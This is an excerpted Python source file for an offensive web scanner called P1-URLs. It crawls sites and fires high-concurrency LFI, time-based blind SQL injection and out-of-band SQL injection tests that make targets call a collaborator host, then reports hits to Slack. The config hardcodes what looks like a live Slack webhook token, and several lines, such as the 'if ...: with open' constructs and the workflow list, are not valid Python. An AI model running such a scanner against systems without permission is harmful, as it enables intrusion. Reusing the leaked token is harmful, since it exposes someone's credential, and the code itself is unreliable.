#!/usr/bin/env python3
"""
P1-URLs.py - v1.6.3 Definitive Production Release

This version features traceable, interactively-logged Out-of-Band (OOB) SQLi
detection with an expanded and more evasive payload set, alongside all
previous high-speed and dynamic testing capabilities. This is the final,
...
# === Config ===
# ==============================================================================
# UPDATED: Your final Slack Webhook URL is now in place.
SLACK_WEBHOOK = "https://hooks.slack.com/services/T03JPK11LNM/B0908RQP1GB/hrmkhkKGbO72J0OMa9g4kb0" 

# File paths, tool settings, and all other configs are final.
BULK_URLS_OUTPUT = "target_bulk_urls.txt"; DEDUPED_URLS = "unique_urls_filtered.txt"
GF_PATTERNS = ["lfi", "rce", "redirect", "sqli", "ssrf", "ssti", "xss"]
KATANA_CONCURRENCY, CONCURRENCY = 50, 50
TIME_DELAY, REQUEST_TIMEOUT = 8, 12
...
def print_banner():
    ...
    for i in range(5): console.print(f"[bold green]{''.join(random.choice('01 ') for _ in range(os.get_terminal_size().columns))}[/bold green]", overflow="hidden", no_wrap=True); time.sleep(0.02)
    ascii_art_lines = ["██████╗  ██╗    ██████╗ ██████╗ ██╗     ███████╗","██╔══██╗ ██║    ██╔══██╗██╔══██╗██║     ██╔════╝","██████╔╝ ██║    ██║  ██║██████╔╝██║     ███████╗","██╔═══╝  ██║    ██║  ██║██╔══██╗██║     ╚════██║","██║      ███████╗██████╔╝██║  ██║███████╗███████║","╚═╝      ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝"]
...
def gather_urls(input_file, output_file):
    ...
    if katana_result: with open(output_file, 'w') as out: out.write(katana_result); console.print(f"[bold green][✔] Katana bulk scan complete.[/bold green]")
...
def run_uro(input_file, output_file):
    ...
    if uro_result: with open(output_file, "w") as out: out.write(uro_result)
    console.print(f"[bold green][✔] Deduplication complete. Unique URLs: {len(uro_result.strip().split()) if uro_result else 0}[/bold green]")
...
def test_lfi_dynamically(lfi_urls_file, args, lfi_results_file):
    console.print("\n[bold cyan]Step 4: Advanced LFI Testing (High-Throughput)[/]")
    ...
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        ...
        for future in as_completed(futures):
            ...
            if param_key in found_params: continue
    ...
    console.print(f"[bold green][✔] High-Throughput LFI scan complete.[/bold green]")
...
def _fire_oob_payload(target_url, method, headers, oob_id, oob_log_file, full_details):
    report_and_log(f"Vivek - Firing OOB SQLi Payload", {"OOB ID": oob_id, **full_details}, oob_log_file, severity="INFO", icon="📡")
...
def check_sqli_payload(url, method, payload, injection_point_type, injection_point_name, db_name, test_type, oob_id, oob_log_file):
    ...
    if test_type == "Time-Based":
        if _check_sqli_vulnerability_time(malicious_url, method, headers):
            return {"url": url, "db": db_name, "payload": payload, "details": {"Injection Point": f"{injection_point_type}: {injection_point_name}", "Method": method, "Type": "Time-Based"}}
    elif test_type == "OOB" and oob_id and oob_log_file:
        full_details = {"URL": url, "Injection Point": f"{injection_point_type}: {injection_point_name}", "Method": method, "Payload Used": payload}
        _fire_oob_payload(malicious_url, method, headers, oob_id, oob_log_file, full_details)
    return None

def test_blind_sqli(sqli_urls_file, blind_sqli_results_file, oob_log_file, args):
    console.print("\n[bold cyan]Step 5: Advanced Blind SQLi Testing (High-Throughput)[/]")
    ...
    console.print("[*] Preparing all possible SQLi test cases...")
    if args.collab_url:
        collab_host = urlparse(args.collab_url).netloc or args.collab_url; 
        console.print(f"[bold bright_blue]OOB testing enabled. Monitor your callback server: {collab_host}[/]"); 
        send_status_update(f"   ...OOB testing is active. Monitor `{collab_host}` and log file `{oob_log_file}` for interactions.")

    for url in urls:
        original_params = parse_qs(urlparse(url).query, keep_blank_values=True)
        # Prepare Time-Based Payloads
        for param, values in original_params.items():
            for db, payloads in BLIND_SQLI_PAYLOADS.items():
                for p_template in payloads:
                    payload = p_template.format(delay=TIME_DELAY, val=(values[0] if values else ""))
                    all_test_cases.extend([ (url, "GET", payload, "Parameter", param, db, "Time-Based", None, None), (url, "GET", payload, "Parameter-HPP", param, db, "Time-Based", None, None) ])
        ...
        # Prepare OOB Payloads
        if collab_host:
            for param, values in original_params.items():
                for db, payloads in OOB_SQLI_PAYLOADS.items():
                    for p_template in payloads:
                        oob_id, payload = generate_oob_id(), p_template.format(oob_id=generate_oob_id(), collab_url=collab_host, val=(values[0] if values else ""))
                        all_test_cases.extend([(url, "GET", payload, "Parameter", param, db, "OOB", oob_id, oob_log_file), (url, "GET", payload, "Parameter-HPP", param, db, "OOB", oob_id, oob_log_file)])
            for method in METHODS_TO_TEST:
                for header in HEADERS_TO_TEST:
                    for db, payloads in OOB_SQLI_PAYLOADS.items():
                        for p_template in payloads:
                            oob_id, payload = generate_oob_id(), p_template.format(oob_id=generate_oob_id(), collab_url=collab_host, val="")
                            all_test_cases.append((url, method, payload, "Header", header, db, "OOB", oob_id, oob_log_file))

    send_status_update(f"⚙️ `[5/6]` Starting advanced Blind SQLi testing with *{len(all_test_cases)}* total checks."); console.print(f"[*] Submitting {len(all_test_cases)} SQLi test cases to the thread pool (Concurrency: {CONCURRENCY})...")
    found_vuln_keys = set()
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        ...
        for future in as_completed(futures):
            result = future.result()
            if result:
                vuln_key = f"{result['url']}_{result['details']['Injection Point']}"
                if vuln_key not in found_vuln_keys:
                    found_vuln_keys.add(vuln_key); 
                    report_and_log("Vivek - Blind SQLi Vulnerability Found", {"URL": result['url'],"Injection Point": result['details']['Injection Point'],"Method": result['details']['Method'],"Detected DB": result['db'],"Payload Used": result['payload']}, blind_sqli_results_file)
...
def main():
    parser = argparse.ArgumentParser(description="P1-URLs Scanner - v1.6.3")
    ...
    parser.add_argument("-c", "--collab-url", help="URL for Out-of-Band (OOB) SQLi interaction checks.")
    ...
    workflow_map = [
        ("Deduplicating URLs...", lambda: run_uro(str(input_file), deduped_urls_path)) if args.use_urls else 
        (("Gathering URLs...", lambda: gather_urls(str(input_file), output_dir/BULK_URLS_OUTPUT)),
    ...
    # Flatten the workflow list
    workflow = []
    for item in workflow_map:
        if isinstance(item, tuple) and callable(item[1]): workflow.append(item)
        else: workflow.extend(item)
        
    for i, (name, func) in enumerate(workflow, 1): send_status_update(f"⚙️ `[{i}/{len(workflow)}]` Starting {name}"); func()
